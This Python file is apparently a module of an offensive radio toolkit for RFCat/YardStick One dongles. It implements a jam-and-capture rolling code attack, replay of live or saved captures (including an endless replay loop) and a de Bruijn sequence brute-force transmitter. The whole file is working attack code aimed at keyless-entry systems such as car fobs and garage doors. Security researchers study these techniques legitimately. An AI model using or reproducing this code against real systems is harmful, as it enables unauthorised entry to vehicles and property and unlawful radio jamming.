import RFFunctions as tools
import findDevices, jam, utilities
import time, sys, os
sys.dont_write_bytecode = True

#-----------------Rolling Code-------------------------#
def rollingCode(d, rf_settings, rolling_code, jamming_variance, verbose=False):
    """Sets up for a rolling code attack. Requires a frequency and an RFCat Object."""
    
    if verbose:
        print("ROLLING CODE REQUIRES 2 YardSticks Plugged In")
    
    j = jam.setupJammer(1, rf_settings)

    jam.jamming(j, "start", rf_settings, rolling_code, jamming_variance)
    roll_captures, signal_strength = tools.capturePayload(d, rolling_code, rf_settings)
    
    if verbose:
        print("Waiting to capture your rolling code transmission")
        print(f"Signal Strength: {signal_strength}")
        print(f"Captured Roll Codes: {roll_captures}")

    payloads = tools.createBytesFromPayloads(roll_captures)

    time.sleep(1)
    jam.jamming(j, "stop", rf_settings, rolling_code, jamming_variance)

    print("Sending First Payload")
    tools.sendTransmission(payloads[0], d)
    
    response = input("Ready to send second Payload? (y/n): ")
    if response.lower() == "y":
        tools.sendTransmission(payloads[1], d)
    else:
        response = input("Choose a name to save your file as and press Enter: ")
        save_path = os.path.join("./captures", f"{response}.cap")
        with open(save_path, 'w') as file:
            file.write(roll_captures[1])
        print(f"Saved file as: {save_path}. You can manually replay this later with -s -u.")
#------------------End Roll Code-------------------------#

#---------------Replay Live Capture----------------------#
def replayLiveCapture(d, rolling_code, rf_settings, verbose=False):
    """Replays a live capture in real time. Allows you to select and replay a capture or save it for later."""
    
    replay_capture, signal_strength = tools.capturePayload(d, rolling_code, rf_settings)
    replay_capture = [replay_capture]

    if verbose:
        print(f"Signal Strength: {signal_strength}")
        print(f"Captured Payload: {replay_capture}")

    response = input("Replay this capture? (y/n): ")
    if response.lower() == 'y':
        payloads = tools.createBytesFromPayloads(replay_capture)
        for payload in payloads:
            print("WAITING TO SEND")
            time.sleep(1)
            tools.sendTransmission(payload, d)

    response = input("Save this capture for later? (y/n): ")
    if response.lower() == 'y':
        mytime = time.strftime('%Y_%m_%d_%H%M%S')
        save_path = os.path.join("./captures", f"{mytime}_payload.cap")
        with open(save_path, 'w') as file:
            file.write(replay_capture[0])
        print(f"Saved file as: {save_path}.")
#---------------End Replay Live Capture-------------------#

#---------------Replay Saved Capture----------------------#
def replaySavedCapture(d, uploaded_payload, verbose=False):
    """Imports an old capture and replays it from a file."""
    
    try:
        with open(uploaded_payload) as f:
            payloads = f.readlines()
            
            if verbose:
                print(f"Loaded Payloads: {payloads}")
                
            payloads = tools.createBytesFromPayloads(payloads)

            response = input("Send once, or forever? (o/f) Default = o: ")

            if response.lower() == "f":
                print("\nNOTE: TO STOP YOU NEED TO CTRL-Z and Unplug/Plug IN YARDSTICK-ONE\n")
                while True:
                    for payload in payloads:
                        if verbose:
                            print("WAITING TO SEND")
                        time.sleep(1)  # You may not want this if you need rapid fire tx
                        tools.sendTransmission(payload, d)
            else:
                for payload in payloads:
                    if verbose:
                        print("WAITING TO SEND")
                    time.sleep(1)
                    tools.sendTransmission(payload, d)
    except FileNotFoundError:
        print(f"Error: The file {uploaded_payload} was not found.")
#--------------- End Replay Saved Capture-------------------#

#---------------Send DeBruijn Sequence Attack----------------------#
# https://en.wikipedia.org/wiki/De_Bruijn_sequence
def deBruijn(d, verbose=False):
    """Sends a binary de Bruijn payload to brute-force a signal."""
    
    response = input("What length de Bruijn would you like to try: ")

    try:
        binary = utilities.deBruijn(2, int(response))
        payload = tools.turnToBytes(binary)
        if verbose:
            print(f'Sending {len(binary)} bits length binary de Bruijn payload formatted to bytes')
        
        tools.sendTransmission(payload, d)
    except ValueError:
        print("Error: Please enter a valid integer for the de Bruijn length.")
#----------------- End DeBruijn Sequence Attack--------------------#
